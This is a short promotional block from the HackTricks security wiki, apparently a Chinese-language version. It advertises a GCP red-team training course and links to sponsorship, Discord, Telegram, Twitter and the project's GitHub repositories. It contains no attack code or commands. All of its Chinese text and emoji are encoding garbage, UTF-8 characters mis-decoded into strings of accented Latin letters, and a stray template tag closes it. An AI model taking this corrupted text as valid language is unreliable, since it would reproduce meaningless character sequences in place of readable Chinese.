å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æ”»å‡»ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
